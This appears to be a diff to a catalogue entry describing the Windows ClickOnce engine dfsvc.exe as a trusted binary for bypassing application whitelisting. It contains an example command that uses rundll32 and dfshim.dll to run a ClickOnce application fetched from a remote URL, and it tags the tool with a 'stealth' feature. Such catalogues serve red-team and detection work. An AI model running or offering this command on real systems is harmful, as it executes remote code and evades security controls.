@@ -2,7 +2,8 @@
 id: windows-bypass-dfsvc
 namespace: windows:bypass:dfsvc
 name: dfsvc
-description: 'ClickOnce engine in Windows used by .NET Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe.'
+description: 'ClickOnce engine in Windows used by .NET Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe;
+  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,10 @@ resource_profile:
 allowed-tools:
 - dfsvc
 parameters: []
-features: []
+features:
+- pipes-stdin
+- pipes-stdout
+- stealth
 execution:
   template: dfsvc
   sandbox: execFile
@@ -49,7 +53,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host) (Use binary to bypass Application whitelisting)
+- description: Executes click-once-application from Url (trampoline for Dfsvc.exe,
+    DotNet ClickOnce host) (Use binary to bypass Application whitelisting)
   command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
 references:
 - label: ShmooCon-2015-Simple-WLEvasion.pdf
@@ -69,7 +74,6 @@ install:
   commands:
   - choco install dfsvc
 ---
-
 
 # dfsvc
 
